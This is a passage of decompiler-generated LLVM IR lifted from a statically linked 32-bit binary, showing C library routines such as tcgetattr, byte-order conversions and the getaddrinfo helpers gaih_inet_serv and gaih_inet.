  %v3_805d0e4 = inttoptr i32 %arg1 to i8*
  %v4_805d0e4 = call i32 @strtok_r(i8* %v3_805d0e4, i32 %arg2, i32 ptrtoint (i32* @global_var_807cf20.714 to i32))
  ret i32 %v4_805d0e4
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_805d0fc = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_805d101 = icmp eq i32 %v3_805d0fc, 0
  %v1_805d103 = zext i1 %v1_805d101 to i32
  ret i32 %v1_805d103
}

define i32 @__libc_tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805d11e = call i32 @ioctl(i32 %arg1, i32 21513, i32 1)
  ret i32 %v3_805d11e
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_5()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805d128 = load i32, i32* @esi, align 4
  %v0_805d129 = load i32, i32* @ebx, align 4
  store i32 %v0_805d129, i32* %stack_var_-8, align 4
  %v2_805d12d = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_805d12d, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_805d13f = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_805d12d)
  store i32 %v3_805d13f, i32* %eax.global-to-local, align 4
  store i32 %v3_805d13f, i32* @esi, align 4
  %v1_805d149 = icmp eq i32 %v3_805d13f, 0
  %v1_805d14b = icmp eq i1 %v1_805d149, false
  br i1 %v1_805d14b, label %dec_label_pc_805d190, label %dec_label_pc_805d14d

dec_label_pc_805d14d:                             ; preds = %entry
  %v3_805d14d = load i32, i32* %stack_var_-44, align 4
  %v1_805d151 = load i32, i32* @ebx, align 4
  %v2_805d151 = inttoptr i32 %v1_805d151 to i32*
  store i32 %v3_805d14d, i32* %v2_805d151, align 4
  %v1_805d157 = load i32, i32* @ebx, align 4
  %v2_805d157 = add i32 %v1_805d157, 4
  %v3_805d157 = inttoptr i32 %v2_805d157 to i32*
  %v1_805d15e = load i32, i32* @ebx, align 4
  %v2_805d15e = add i32 %v1_805d15e, 8
  %v3_805d15e = inttoptr i32 %v2_805d15e to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_805d165 = load i32, i32* @ebx, align 4
  %v2_805d165 = add i32 %v1_805d165, 12
  %v3_805d165 = inttoptr i32 %v2_805d165 to i32*
  store i32 %tmp3, i32* %v3_805d165, align 4
  %v4_805d168 = zext i8 %tmp to i32
  %v5_805d168 = load i32, i32* %eax.global-to-local, align 4
  %v6_805d168 = and i32 %v5_805d168, -256
  %v7_805d168 = or i32 %v6_805d168, %v4_805d168
  store i32 %v7_805d168, i32* %eax.global-to-local, align 4
  %v2_805d16c = load i32, i32* @ebx, align 4
  %v3_805d16c = add i32 %v2_805d16c, 16
  %v4_805d16c = inttoptr i32 %v3_805d16c to i8*
  store i8 %tmp, i8* %v4_805d16c, align 1
  %v0_805d16f = load i32, i32* %eax.global-to-local, align 4
  %v2_805d172 = ptrtoint i32* %stack_var_-27 to i32
  %v0_805d177 = load i32, i32* @ebx, align 4
  %v1_805d177 = add i32 %v0_805d177, 17
  store i32 %v1_805d177, i32* %eax.global-to-local, align 4
  %v4_805d17b = call i32 @__GI_mempcpy(i32 %v1_805d177, i32 %v2_805d172, i32 19, i32 %v0_805d16f)
  store i32 %v4_805d17b, i32* %eax.global-to-local, align 4
  %v3_805d188 = inttoptr i32 %v4_805d17b to i8*
  %v4_805d188 = call i32 @__GI_memset(i8* %v3_805d188, i32 0, i32 13)
  store i32 %v4_805d188, i32* %eax.global-to-local, align 4
  %v0_805d190.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805d190

dec_label_pc_805d190:                             ; preds = %entry, %dec_label_pc_805d14d
  %v0_805d190 = phi i32 [ %v3_805d13f, %entry ], [ %v0_805d190.pre, %dec_label_pc_805d14d ]
  store i32 %v0_805d190, i32* %eax.global-to-local, align 4
  %v2_805d195 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805d195, i32* @ebx, align 4
  store i32 %v0_805d128, i32* @esi, align 4
  ret i32 %v0_805d190

; uselistorder directives
  uselistorder i32 %v0_805d190, { 1, 0 }
  uselistorder i32 %v3_805d13f, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_805d190, { 1, 0 }
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805d19c = trunc i32 %arg1 to i16
  %v2_805d19c = call i16 @llvm.bswap.i16(i16 %v1_805d19c)
  %v3_805d19c = zext i16 %v2_805d19c to i32
  ret i32 %v3_805d19c
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805d1a8 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_805d1a8
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805d1af = trunc i32 %arg1 to i16
  %v2_805d1af = call i16 @llvm.bswap.i16(i16 %v1_805d1af)
  %v3_805d1af = zext i16 %v2_805d1af to i32
  ret i32 %v3_805d1af
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805d1bb = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_805d1bb
}

define i32 @gaih_inet_serv(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805d1c3 = load i32, i32* @edi, align 4
  %v0_805d1c4 = load i32, i32* @esi, align 4
  %v0_805d1c5 = load i32, i32* @ebx, align 4
  store i32 %v0_805d1c5, i32* %stack_var_-16, align 4
  %v15_805d1c6 = ptrtoint i32* %stack_var_-60 to i32
  %v0_805d1c9 = load i32, i32* @edx, align 4
  store i32 %v0_805d1c9, i32* @ebx, align 4
  %v0_805d1cb = load i32, i32* @eax, align 4
  %v0_805d1ce = load i32, i32* @ecx, align 4
  store i32 %tmp4, i32* @edi, align 4
  %v2_805d1e7 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805d1ee = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_805d1d9

dec_label_pc_805d1d9:                             ; preds = %dec_label_pc_805d214, %entry
  %v0_805d1df = phi i32 [ %v15_805d1c6, %entry ], [ %v1_805d200, %dec_label_pc_805d214 ]
  %storemerge = phi i32 [ 1024, %entry ], [ %v2_805d214, %dec_label_pc_805d214 ]
  store i32 %storemerge, i32* @esi, align 4
  %v1_805d1d9 = add i32 %storemerge, 30
  %v1_805d1dc = and i32 %v1_805d1d9, -16
  store i32 %v1_805d1dc, i32* %eax.global-to-local, align 4
  %v2_805d1df = sub i32 %v0_805d1df, %v1_805d1dc
  %v1_805d1e1 = add i32 %v2_805d1df, 15
  store i32 %v1_805d1e1, i32* %edx.global-to-local, align 4
  %v2_805d1e5 = add i32 %v2_805d1df, -4
  %v3_805d1e5 = inttoptr i32 %v2_805d1e5 to i32*
  store i32 %v1_805d1dc, i32* %v3_805d1e5, align 4
  %v0_805d1e6 = load i32, i32* %eax.global-to-local, align 4
  %v2_805d1e6 = add i32 %v2_805d1df, -8
  %v3_805d1e6 = inttoptr i32 %v2_805d1e6 to i32*
  store i32 %v0_805d1e6, i32* %v3_805d1e6, align 4
  %v2_805d1ea = add i32 %v2_805d1df, -12
  %v3_805d1ea = inttoptr i32 %v2_805d1ea to i32*
  store i32 %v2_805d1e7, i32* %v3_805d1ea, align 4
  %v0_805d1eb = load i32, i32* %edx.global-to-local, align 4
  %v1_805d1eb = and i32 %v0_805d1eb, -16
  store i32 %v1_805d1eb, i32* %edx.global-to-local, align 4
  %v0_805d1f1 = load i32, i32* @esi, align 4
  %v2_805d1f1 = add i32 %v2_805d1df, -16
  %v3_805d1f1 = inttoptr i32 %v2_805d1f1 to i32*
  store i32 %v0_805d1f1, i32* %v3_805d1f1, align 4
  %v0_805d1f2 = load i32, i32* %edx.global-to-local, align 4
  %v2_805d1f2 = add i32 %v2_805d1df, -20
  %v3_805d1f2 = inttoptr i32 %v2_805d1f2 to i32*
  store i32 %v0_805d1f2, i32* %v3_805d1f2, align 4
  %v2_805d1f3 = add i32 %v2_805d1df, -24
  %v3_805d1f3 = inttoptr i32 %v2_805d1f3 to i32*
  store i32 %v2_805d1ee, i32* %v3_805d1f3, align 4
  %v0_805d1f4 = load i32, i32* @ebx, align 4
  %v1_805d1f4 = add i32 %v0_805d1f4, 3
  store i32 %v1_805d1f4, i32* %eax.global-to-local, align 4
  %v2_805d1f7 = add i32 %v2_805d1df, -28
  %v3_805d1f7 = inttoptr i32 %v2_805d1f7 to i32*
  store i32 %v1_805d1f4, i32* %v3_805d1f7, align 4
  %v5_805d1f8 = add i32 %v2_805d1df, -32
  %v6_805d1f8 = inttoptr i32 %v5_805d1f8 to i32*
  store i32 %v0_805d1cb, i32* %v6_805d1f8, align 4
  %v9_805d1fb = call i32 @getservbyname_r(i32 %v0_805d1ce, i32 %v0_805d1cb, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v9_805d1fb, i32* %eax.global-to-local, align 4
  %v0_805d200 = load i32, i32* @esp, align 4
  %v1_805d200 = add i32 %v0_805d200, 32
  %v1_805d203 = icmp eq i32 %v9_805d1fb, 0
  %v1_805d205 = icmp eq i1 %v1_805d203, false
  br i1 %v1_805d205, label %dec_label_pc_805d20f, label %dec_label_pc_805d207

dec_label_pc_805d207:                             ; preds = %dec_label_pc_805d1d9
  %v3_805d207 = load i32, i32* %stack_var_-20, align 4
  %v4_805d207 = icmp eq i32 %v3_805d207, 0
  %v1_805d20b = icmp eq i1 %v4_805d207, false
  br i1 %v1_805d20b, label %dec_label_pc_805d218, label %dec_label_pc_805d24b

dec_label_pc_805d20f:                             ; preds = %dec_label_pc_805d1d9
  %v9_805d20f = icmp eq i32 %v9_805d1fb, 34
  %v1_805d212 = icmp eq i1 %v9_805d20f, false
  br i1 %v1_805d212, label %dec_label_pc_805d24b, label %dec_label_pc_805d214

dec_label_pc_805d214:                             ; preds = %dec_label_pc_805d20f
  %v0_805d214 = load i32, i32* @esi, align 4
  %v2_805d214 = mul i32 %v0_805d214, 2
  br label %dec_label_pc_805d1d9

dec_label_pc_805d218:                             ; preds = %dec_label_pc_805d207
  %v0_805d218 = load i32, i32* @edi, align 4
  %v1_805d218 = inttoptr i32 %v0_805d218 to i32*
  store i32 0, i32* %v1_805d218, align 4
  %v0_805d21e = load i32, i32* @ebx, align 4
  %v1_805d21e = inttoptr i32 %v0_805d21e to i8*
  %v2_805d21e = load i8, i8* %v1_805d21e, align 1
  %v3_805d21e = sext i8 %v2_805d21e to i32
  store i32 %v3_805d21e, i32* %eax.global-to-local, align 4
  %v1_805d221 = load i32, i32* @edi, align 4
  %v2_805d221 = add i32 %v1_805d221, 4
  %v3_805d221 = inttoptr i32 %v2_805d221 to i32*
  store i32 %v3_805d21e, i32* %v3_805d221, align 4
  %v0_805d224 = load i32, i32* @ebx, align 4
  %v1_805d224 = add i32 %v0_805d224, 2
  %v2_805d224 = inttoptr i32 %v1_805d224 to i8*
  %v3_805d224 = load i8, i8* %v2_805d224, align 1
  %v4_805d224 = and i8 %v3_805d224, 2
  %v5_805d224 = icmp eq i8 %v4_805d224, 0
  br i1 %v5_805d224, label %dec_label_pc_805d239, label %dec_label_pc_805d22a

dec_label_pc_805d22a:                             ; preds = %dec_label_pc_805d218
  store i32 %v0_805d1ce, i32* %edx.global-to-local, align 4
  %v1_805d22d = add i32 %v0_805d1ce, 12
  %v2_805d22d = inttoptr i32 %v1_805d22d to i32*
  %v3_805d22d = load i32, i32* %v2_805d22d, align 4
  br label %dec_label_pc_805d23d

dec_label_pc_805d239:                             ; preds = %dec_label_pc_805d218
  %v1_805d239 = add i32 %v0_805d224, 1
  %v2_805d239 = inttoptr i32 %v1_805d239 to i8*
  %v3_805d239 = load i8, i8* %v2_805d239, align 1
  %v4_805d239 = sext i8 %v3_805d239 to i32
  br label %dec_label_pc_805d23d

dec_label_pc_805d23d:                             ; preds = %dec_label_pc_805d22a, %dec_label_pc_805d239
  %storemerge2 = phi i32 [ %v3_805d22d, %dec_label_pc_805d22a ], [ %v4_805d239, %dec_label_pc_805d239 ]
  %v1_805d23d = load i32, i32* @edi, align 4
  %v2_805d23d = add i32 %v1_805d23d, 8
  %v3_805d23d = inttoptr i32 %v2_805d23d to i32*
  store i32 %storemerge2, i32* %v3_805d23d, align 4
  %v3_805d240 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805d240, i32* %eax.global-to-local, align 4
  %v1_805d243 = add i32 %v3_805d240, 8
  %v2_805d243 = inttoptr i32 %v1_805d243 to i32*
  %v3_805d243 = load i32, i32* %v2_805d243, align 4
  store i32 %v3_805d243, i32* %eax.global-to-local, align 4
  %v1_805d246 = load i32, i32* @edi, align 4
  %v2_805d246 = add i32 %v1_805d246, 12
  %v3_805d246 = inttoptr i32 %v2_805d246 to i32*
  store i32 %v3_805d243, i32* %v3_805d246, align 4
  br label %dec_label_pc_805d24b

dec_label_pc_805d24b:                             ; preds = %dec_label_pc_805d20f, %dec_label_pc_805d207, %dec_label_pc_805d23d
  %storemerge1 = phi i32 [ 0, %dec_label_pc_805d23d ], [ 264, %dec_label_pc_805d207 ], [ 264, %dec_label_pc_805d20f ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  %v2_805d24e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805d24e, i32* @ebx, align 4
  store i32 %v0_805d1c4, i32* @esi, align 4
  store i32 %v0_805d1c3, i32* @edi, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_805d1ce, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 3, 0, 1, 2, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_805d24b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805d23d, { 1, 0 }
}

define i32 @gaih_inet(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp108 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-148 = alloca i8*, align 4
  %stack_var_4 = alloca i8*, align 4
  store i8* %arg1, i8** %stack_var_4, align 4
  %tmp118 = inttoptr i32 %arg3 to i8*
  %stack_var_-114 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_-252 = alloca i8*, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-221 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %v0_805d258 = load i32, i32* @ebx, align 4
  %v2_805d25f = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805d25f, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  store i32 %v2_805d25f, i32* %stack_var_-20, align 4
  store i32 0, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_805d272 = add i32 %arg3, 4
  %v2_805d272 = inttoptr i32 %v1_805d272 to i32*
  %v3_805d272 = load i32, i32* %v2_805d272, align 4
  store i32 %v3_805d272, i32* %eax.global-to-local, align 4
  %v1_805d275 = icmp eq i32 %v3_805d272, 0
  br i1 %v1_805d275, label %dec_label_pc_805d288, label %dec_label_pc_805d279

dec_label_pc_805d279:                             ; preds = %entry
  store i32 0, i32* %stack_var_-156, align 4
  %v9_805d283 = icmp eq i32 %v3_805d272, 10
  %v1_805d286 = icmp eq i1 %v9_805d283, false
  br i1 %v1_805d286, label %dec_label_pc_805d29e, label %dec_label_pc_805d288

dec_label_pc_805d288:                             ; preds = %dec_label_pc_805d279, %entry
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v1_805d28b = inttoptr i32 %arg3 to i32*
  %v2_805d28b = load i32, i32* %v1_805d28b, align 4
  %v1_805d28d = udiv i32 %v2_805d28b, 8
  %v1_805d295 = urem i32 %v1_805d28d, 2
  store i32 %v1_805d295, i32* %eax.global-to-local, align 4
  store i32 %v1_805d295, i32* %stack_var_-156, align 4
  br label %dec_label_pc_805d29e

dec_label_pc_805d29e:                             ; preds = %dec_label_pc_805d279, %dec_label_pc_805d288
  store i32 %v2_805d25f, i32* %eax.global-to-local, align 4
  %v3_805d2a7 = bitcast i32* %stack_var_-48 to i8*
  %v4_805d2a7 = call i32 @__GI_memset(i8* %v3_805d2a7, i32 0, i32 16)
  store i32 %v4_805d2a7, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v1_805d2b2 = add i32 %arg3, 12
  %v2_805d2b2 = inttoptr i32 %v1_805d2b2 to i32*
  %v3_805d2b2 = load i32, i32* %v2_805d2b2, align 4
  store i32 %v3_805d2b2, i32* @ecx, align 4
  %v1_805d2b5 = icmp eq i32 %v3_805d2b2, 0
  br i1 %v1_805d2b5, label %dec_label_pc_805d2c0, label %dec_label_pc_805d29e.dec_label_pc_805d2ce.preheader_crit_edge

dec_label_pc_805d29e.dec_label_pc_805d2ce.preheader_crit_edge: ; preds = %dec_label_pc_805d29e
  %.pre = add i32 %arg3, 8
  %.pre106 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_805d2ce.preheader

dec_label_pc_805d2c0:                             ; preds = %dec_label_pc_805d29e
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_805d2c3 = add i32 %arg3, 8
  %v2_805d2c3 = inttoptr i32 %v1_805d2c3 to i32*
  %v3_805d2c3 = load i32, i32* %v2_805d2c3, align 4
  %v4_805d2c3 = icmp eq i32 %v3_805d2c3, 0
  %v1_805d2c7 = icmp eq i1 %v4_805d2c3, false
  br i1 %v1_805d2c7, label %dec_label_pc_805d2ce.preheader, label %dec_label_pc_805d31e

dec_label_pc_805d2ce.preheader:                   ; preds = %dec_label_pc_805d29e.dec_label_pc_805d2ce.preheader_crit_edge, %dec_label_pc_805d2c0
  %v2_805d2de.pre-phi = phi i32* [ %.pre106, %dec_label_pc_805d29e.dec_label_pc_805d2ce.preheader_crit_edge ], [ %v2_805d2c3, %dec_label_pc_805d2c0 ]
  store i32 ptrtoint (i8** @global_var_806d747.715 to i32), i32* @ebx, align 4
  %v3_805d2ce201 = load i8, i8* inttoptr (i32 add (i32 ptrtoint (i8** @global_var_806d747.715 to i32), i32 3) to i8*), align 1
  %v4_805d2ce202 = zext i8 %v3_805d2ce201 to i32
  %v6_805d2ce203 = and i32 %arg3, -256
  %v7_805d2ce204 = or i32 %v4_805d2ce202, %v6_805d2ce203
  store i32 %v7_805d2ce204, i32* %edx.global-to-local, align 4
  %v4_805d2d7205 = icmp eq i8 %v3_805d2ce201, 0
  br i1 %v4_805d2d7205, label %dec_label_pc_805d307, label %dec_label_pc_805d2db

dec_label_pc_805d2cb:                             ; preds = %dec_label_pc_805d2f6, %dec_label_pc_805d2e5
  %v5_805d2ce70 = phi i32 [ %v5_805d2ce69, %dec_label_pc_805d2f6 ], [ %v3_805d2de, %dec_label_pc_805d2e5 ]
  %v1_805d2cb = add i32 %v0_805d2cb206, 7
  store i32 %v1_805d2cb, i32* @ebx, align 4
  %v1_805d2ce = add i32 %v0_805d2cb206, 10
  %v2_805d2ce = inttoptr i32 %v1_805d2ce to i8*
  %v3_805d2ce = load i8, i8* %v2_805d2ce, align 1
  %v4_805d2ce = zext i8 %v3_805d2ce to i32
  %v6_805d2ce = and i32 %v5_805d2ce70, -256
  %v7_805d2ce = or i32 %v4_805d2ce, %v6_805d2ce
  store i32 %v7_805d2ce, i32* %edx.global-to-local, align 4
  %v4_805d2d7 = icmp eq i8 %v3_805d2ce, 0
  br i1 %v4_805d2d7, label %dec_label_pc_805d307, label %dec_label_pc_805d2db

dec_label_pc_805d2db:                             ; preds = %dec_label_pc_805d2ce.preheader, %dec_label_pc_805d2cb
  %v0_805d2cb206 = phi i32 [ %v1_805d2cb, %dec_label_pc_805d2cb ], [ ptrtoint (i8** @global_var_806d747.715 to i32), %dec_label_pc_805d2ce.preheader ]
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v3_805d2de = load i32, i32* %v2_805d2de.pre-phi, align 4
  store i32 %v3_805d2de, i32* %edx.global-to-local, align 4
  %v1_805d2e1 = icmp eq i32 %v3_805d2de, 0
  br i1 %v1_805d2e1, label %dec_label_pc_805d2ec, label %dec_label_pc_805d2e5

dec_label_pc_805d2e5:                             ; preds = %dec_label_pc_805d2db
  %v1_805d2e5 = inttoptr i32 %v0_805d2cb206 to i8*
  %v2_805d2e5 = load i8, i8* %v1_805d2e5, align 1
  %v3_805d2e5 = sext i8 %v2_805d2e5 to i32
  store i32 %v3_805d2e5, i32* %eax.global-to-local, align 4
  %v12_805d2e8 = icmp eq i32 %v3_805d2de, %v3_805d2e5
  %v1_805d2ea = icmp eq i1 %v12_805d2e8, false
  br i1 %v1_805d2ea, label %dec_label_pc_805d2cb, label %dec_label_pc_805d2ec

dec_label_pc_805d2ec:                             ; preds = %dec_label_pc_805d2e5, %dec_label_pc_805d2db
  %v5_805d2ce69 = phi i32 [ %v3_805d2de, %dec_label_pc_805d2e5 ], [ 0, %dec_label_pc_805d2db ]
  br i1 %v1_805d2b5, label %dec_label_pc_805d2fe, label %dec_label_pc_805d2f0

dec_label_pc_805d2f0:                             ; preds = %dec_label_pc_805d2ec
  %v1_805d2f0 = add i32 %v0_805d2cb206, 2
  %v2_805d2f0 = inttoptr i32 %v1_805d2f0 to i8*
  %v3_805d2f0 = load i8, i8* %v2_805d2f0, align 1
  %v4_805d2f0 = and i8 %v3_805d2f0, 2
  %v5_805d2f0 = icmp eq i8 %v4_805d2f0, 0
  %v1_805d2f4 = icmp eq i1 %v5_805d2f0, false
  br i1 %v1_805d2f4, label %dec_label_pc_805d2fe, label %dec_label_pc_805d2f6

dec_label_pc_805d2f6:                             ; preds = %dec_label_pc_805d2f0
  %v1_805d2f6 = add i32 %v0_805d2cb206, 1
  %v2_805d2f6 = inttoptr i32 %v1_805d2f6 to i8*
  %v3_805d2f6 = load i8, i8* %v2_805d2f6, align 1
  %v4_805d2f6 = sext i8 %v3_805d2f6 to i32
  store i32 %v4_805d2f6, i32* %eax.global-to-local, align 4
  %v12_805d2fa = icmp eq i32 %v3_805d2b2, %v4_805d2f6
  %v1_805d2fc = icmp eq i1 %v12_805d2fa, false
  br i1 %v1_805d2fc, label %dec_label_pc_805d2cb, label %dec_label_pc_805d2fe

dec_label_pc_805d2fe:                             ; preds = %dec_label_pc_805d2f6, %dec_label_pc_805d2f0, %dec_label_pc_805d2ec
  br label %dec_label_pc_805d323

dec_label_pc_805d307:                             ; preds = %dec_label_pc_805d2cb, %dec_label_pc_805d2ce.preheader
  store i32 %arg3, i32* %edx.global-to-local, align 4
  store i32 263, i32* %eax.global-to-local, align 4
  %v3_805d30f = load i32, i32* %v2_805d2de.pre-phi, align 4
  %v4_805d30f = icmp eq i32 %v3_805d30f, 0
  %v1_805d313 = icmp eq i1 %v4_805d30f, false
  br i1 %v1_805d313, label %dec_label_pc_805dbda, label %dec_label_pc_805dbaa

dec_label_pc_805d31e:                             ; preds = %dec_label_pc_805d2c0
  store i32 ptrtoint (i32* @global_var_806d740.716 to i32), i32* @ebx, align 4
  br label %dec_label_pc_805d323

dec_label_pc_805d323:                             ; preds = %dec_label_pc_805d2fe, %dec_label_pc_805d31e
  %v0_805d46d = phi i32 [ %v0_805d2cb206, %dec_label_pc_805d2fe ], [ ptrtoint (i32* @global_var_806d740.716 to i32), %dec_label_pc_805d31e ]
  %v1_805d323 = icmp eq i32 %arg2, 0
  br i1 %v1_805d323, label %dec_label_pc_805d44d, label %dec_label_pc_805d32b

dec_label_pc_805d32b:                             ; preds = %dec_label_pc_805d323
  %v1_805d32b = add i32 %v0_805d46d, 2
  %v2_805d32b = inttoptr i32 %v1_805d32b to i8*
  %v3_805d32b = load i8, i8* %v2_805d32b, align 1
  %v4_805d32b = urem i8 %v3_805d32b, 2
  %v5_805d32b = icmp eq i8 %v4_805d32b, 0
  %v1_805d32f = icmp eq i1 %v5_805d32b, false
  br i1 %v1_805d32f, label %dec_label_pc_805dbaa, label %dec_label_pc_805d335

dec_label_pc_805d335:                             ; preds = %dec_label_pc_805d32b
  %v1_805d335 = add i32 %arg2, 4
  %v2_805d335 = inttoptr i32 %v1_805d335 to i32*
  %v3_805d335 = load i32, i32* %v2_805d335, align 4
  %v5_805d335 = icmp slt i32 %v3_805d335, 0
  %v1_805d339 = icmp eq i1 %v5_805d335, false
  br i1 %v1_805d339, label %dec_label_pc_805d404, label %dec_label_pc_805d33f

dec_label_pc_805d33f:                             ; preds = %dec_label_pc_805d335
  %v1_805d33f = add i32 %v0_805d46d, 3
  %v2_805d33f = inttoptr i32 %v1_805d33f to i8*
  %v3_805d33f = load i8, i8* %v2_805d33f, align 1
  %v4_805d33f = icmp eq i8 %v3_805d33f, 0
  br i1 %v4_805d33f, label %dec_label_pc_805d372, label %dec_label_pc_805d345

dec_label_pc_805d345:                             ; preds = %dec_label_pc_805d33f
  store i32 %arg3, i32* @ecx, align 4
  store i32 %v0_805d46d, i32* @edx, align 4
  %v8_805d354 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v8_805d354, i32* %eax.global-to-local, align 4
  store i32 %v8_805d354, i32* %stack_var_-20, align 4
  %v1_805d35b = inttoptr i32 %arg2 to i32*
  %v2_805d35b = load i32, i32* %v1_805d35b, align 4
  store i32 %v2_805d35b, i32* @eax, align 4
  %v2_805d35d = call i32 @gaih_inet_serv(i32* nonnull %stack_var_-176)
  store i32 %v2_805d35d, i32* %eax.global-to-local, align 4
  %v1_805d365 = icmp eq i32 %v2_805d35d, 0
  br i1 %v1_805d365, label %dec_label_pc_805d4d3, label %dec_label_pc_805dbda

dec_label_pc_805d372:                             ; preds = %dec_label_pc_805d33f
  %v2_805d372 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805d372, i32* @ecx, align 4
  %v1_805d375 = add i32 %v0_805d46d, 7
  store i32 %v1_805d375, i32* @esi, align 4
  %v1_805d3ed51 = add i32 %v0_805d46d, 10
  %v2_805d3ed52 = inttoptr i32 %v1_805d3ed51 to i8*
  %v3_805d3ed53 = load i8, i8* %v2_805d3ed52, align 1
  %v4_805d3ed54 = icmp eq i8 %v3_805d3ed53, 0
  %v1_805d3f160 = icmp eq i1 %v4_805d3ed54, false
  br i1 %v1_805d3f160, label %dec_label_pc_805d380.lr.ph, label %dec_label_pc_805d3f3

dec_label_pc_805d380.lr.ph:                       ; preds = %dec_label_pc_805d372
  %v1_805d38c = add i32 %arg3, 8
  %v2_805d38c = inttoptr i32 %v1_805d38c to i32*
  %v8_805d3c0 = ptrtoint i32* %stack_var_-176 to i32
  %v1_805d3c4 = inttoptr i32 %arg2 to i32*
  br label %dec_label_pc_805d380

dec_label_pc_805d380:                             ; preds = %dec_label_pc_805d380.lr.ph, %dec_label_pc_805d3ea
  %v0_805d3b7 = phi i32 [ %v1_805d375, %dec_label_pc_805d380.lr.ph ], [ %v1_805d3ea, %dec_label_pc_805d3ea ]
  %stack_var_-152.161 = phi i32 [ %v2_805d372, %dec_label_pc_805d380.lr.ph ], [ %stack_var_-152.0, %dec_label_pc_805d3ea ]
  %v1_805d380 = add i32 %v0_805d3b7, 2
  %v2_805d380 = inttoptr i32 %v1_805d380 to i8*
  %v3_805d380 = load i8, i8* %v2_805d380, align 1
  %v4_805d380 = sext i8 %v3_805d380 to i32
  store i32 %v4_805d380, i32* @ecx, align 4
  %v2_805d384 = urem i8 %v3_805d380, 2
  %v3_805d384 = icmp eq i8 %v2_805d384, 0
  %v1_805d387 = icmp eq i1 %v3_805d384, false
  br i1 %v1_805d387, label %dec_label_pc_805d3ea, label %dec_label_pc_805d389

dec_label_pc_805d389:                             ; preds = %dec_label_pc_805d380
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v3_805d38c = load i32, i32* %v2_805d38c, align 4
  store i32 %v3_805d38c, i32* %edx.global-to-local, align 4
  %v1_805d38f = icmp eq i32 %v3_805d38c, 0
  br i1 %v1_805d38f, label %dec_label_pc_805d39a, label %dec_label_pc_805d393

dec_label_pc_805d393:                             ; preds = %dec_label_pc_805d389
  %v1_805d393 = inttoptr i32 %v0_805d3b7 to i8*
  %v2_805d393 = load i8, i8* %v1_805d393, align 1
  %v3_805d393 = sext i8 %v2_805d393 to i32
  store i32 %v3_805d393, i32* %eax.global-to-local, align 4
  %v12_805d396 = icmp eq i32 %v3_805d38c, %v3_805d393
